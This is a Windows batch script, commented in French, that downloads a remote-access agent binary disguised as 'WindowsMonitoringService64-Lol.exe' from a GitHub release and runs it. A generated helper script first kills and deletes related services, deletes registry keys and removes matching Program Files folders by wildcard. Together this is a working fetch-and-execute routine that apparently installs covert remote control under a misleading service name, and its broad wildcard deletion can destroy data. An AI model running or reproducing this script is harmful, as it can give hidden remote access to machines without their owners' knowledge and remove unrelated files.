@echo off
setlocal EnableExtensions EnableDelayedExpansion

:: --- CONFIGURATION ---
set "NEW_URL=https://github.com/LightZirconite/MeshAgent/releases/download/exe/WindowsMonitoringService64-Lol.exe"
set "WORK_DIR=C:\AgentUpdate"
set "INSTALLER_NAME=NewAgent.exe"

if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"

echo ==========================================
echo [1] TELECHARGEMENT DU NOUVEL AGENT
echo ==========================================
powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%NEW_URL%' -OutFile '%WORK_DIR%\%INSTALLER_NAME%'"

if not exist "%WORK_DIR%\%INSTALLER_NAME%" (
    echo [ERREUR] Le fichier n'a pas pu etre telecharge. Verifiez l'URL ou la connexion.
    pause
    exit /b
)
echo [OK] Telechargement reussi.

echo ==========================================
echo [2] CREATION DU SCRIPT DE NETTOYAGE
echo ==========================================

(
echo @echo off
echo echo --- DEMARRAGE DU NETTOYAGE ---
echo echo [1/5] Arret des services...
echo for %%%%s in (WindowsMonitoringService LGTWAgent MeshAgent "Mesh Agent") do (
echo    sc stop %%%%s
echo    sc delete %%%%s
echo )
echo echo [2/5] Kill des processus...
echo taskkill /F /IM WindowsMonitoringService64-Lol.exe /T
echo taskkill /F /IM MeshAgent.exe /T
echo taskkill /F /IM MeshService64.exe /T
echo echo [3/5] Nettoyage Registre...
echo reg delete "HKLM\SOFTWARE\Open Source\MeshAgent" /f
echo echo [4/5] Nettoyage Dossiers...
echo for %%%%t in (LGTW Mesh WindowsMonitoring) do (
echo    for /d %%%%d in ("C:\Program Files\*%%%%t*", "C:\Program Files (x86)\*%%%%t*") do (
echo        rd /s /q "%%%%d"
echo    )
echo )
echo echo [5/5] Installation...
echo "%WORK_DIR%\%INSTALLER_NAME%" -fullinstall
echo echo --- TERMINE ! VERIFIEZ SI L'AGENT EST REVENU ---
echo pause
) > "%WORK_DIR%\debug_worker.bat"

echo ==========================================
echo [3] LANCEMENT DU NETTOYAGE (FENETRE SEPAREE)
echo ==========================================
echo Une nouvelle fenetre va s'ouvrir. 
echo Si l'agent se coupe, cette nouvelle fenetre RESTERA ouverte.
timeout /t 3

:: On utilise 'start' pour lancer un processus independant de l'agent actuel
start cmd.exe /c "%WORK_DIR%\debug_worker.bat"

echo.
echo Le script principal a fini son travail. 
echo Regardez l'autre fenetre noire qui vient de s'ouvrir.
pause
